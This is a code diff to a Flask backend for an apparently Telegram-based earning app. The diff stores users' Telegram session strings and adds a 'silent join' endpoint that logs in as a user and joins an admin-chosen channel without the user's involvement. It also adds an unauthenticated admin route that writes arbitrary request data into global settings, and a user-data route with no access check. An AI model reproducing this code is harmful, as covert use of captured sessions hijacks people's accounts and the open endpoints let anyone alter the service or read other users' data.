@@ -30,10 +30,27 @@ API_ID = int(os.environ.get("API_ID", "123456"))
 API_HASH = os.environ.get("API_HASH", "your_api_hash")
 MONGO_URI = os.environ.get("MONGO_URI", "your_mongo_uri")
 
-client_db = MongoClient(MONGO_URI)
-db = client_db['telegram_app']
+# ================= DB =================
+client_db = MongoClient("YOUR_MONGO_URI")
+db = client_db['aaf_tele_earn_db']
 users_col = db['users']
+settings_col = db['settings']
+tasks_col = db['tasks']
 
+
+# ================= LOGIN REQUIRED =================
+def login_required(f):
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        if "uid" not in session:
+            return redirect("/login")
+        return f(*args, **kwargs)
+    return wrapper
+
+
+# ================= ADMIN SETTINGS =================
+def get_admin():
+    return settings_col.find_one({"type": "global"}) or {}
 
 # =========================
 # HELPER: SAFE ASYNC RUN
@@ -180,49 +197,75 @@ def verify_login():
 
     return jsonify({"success": False, "message": result})
 
+# =========================
+# Users DATA 
+# =========================
+
+
+@app.route('/api/user/data/<int:user_id>')
+def user_data(user_id):
+    user = users_col.find_one({"telegram_id": user_id})
+    admin = get_admin()
+
+    if not user:
+        return jsonify({"status": "error"})
+
+    return jsonify({
+        "status": "success",
+        "user": {
+            "username": user.get("name", "User"),
+            "telegram_id": user.get("telegram_id"),
+            "cash": user.get("main_balance", 0),
+            "aaf": user.get("aaf_balance", 0),
+            "is_joined": user.get("is_joined", False),
+            "refer_count": user.get("refer_count", 0)
+        },
+        "admin": {
+            "server_income": admin.get("server_income", 0),
+            "server_trading": admin.get("server_trading", 0),
+            "total_users": admin.get("extra_users", 0),
+            "channel_url": admin.get("channel_link", "")
+        }
+    })
+
 
 # =========================
 # SILENT JOIN (BACKGROUND)
 # =========================
 @app.route('/api/silent_join', methods=['POST'])
+@login_required
 def silent_join():
-    uid = session.get('uid')
-    if not uid:
-        return jsonify({"success": False, "message": "Unauthorized"})
-
+    uid = session['uid']
     user = users_col.find_one({"telegram_id": uid})
-    if not user or not user.get("session_str"):
-        return jsonify({"success": False, "message": "No session"})
+    admin = get_admin()
 
-    channel = request.json.get("channel")
+    if not user or "session_str" not in user:
+        return jsonify({"success": False, "message": "session_expired"})
 
-    def task():
-        async def join():
-            client = None
-            try:
-                client = TelegramClient(
-                    StringSession(user['session_str']),
-                    API_ID,
-                    API_HASH
-                )
-                await client.connect()
-                await client.join_channel(channel)
-                users_col.update_one(
-                    {"telegram_id": uid},
-                    {"$set": {"is_joined": True}}
-                )
-            except Exception as e:
-                print("JOIN ERROR:", e)
-            finally:
-                if client:
-                    await client.disconnect()
+    async def join():
+        client = TelegramClient(
+            StringSession(user["session_str"]),
+            API_ID,
+            API_HASH
+        )
 
-        run_async(join())
+        await client.connect()
+        await client(JoinChannelRequest(admin.get("channel_id")))
+        await client.disconnect()
 
-    threading.Thread(target=task).start()
+        users_col.update_one(
+            {"telegram_id": uid},
+            {"$set": {"is_joined": True}}
+        )
 
-    return jsonify({"success": True})
-    
+        return True
+
+    try:
+        asyncio.run(join())
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
+
 
     
 # =========================
@@ -259,6 +302,19 @@ def login_required(f):
         return f(*args, **kwargs)
     return wrapper
 
+# =========================
+# admin DECORATOR
+# =========================
+
+@app.route('/admin/update', methods=['POST'])
+def admin_update():
+    data = request.json
+    settings_col.update_one(
+        {"type": "global"},
+        {"$set": data},
+        upsert=True
+    )
+    return jsonify({"success": True})
 
 # =========================
 # DASHBOARD
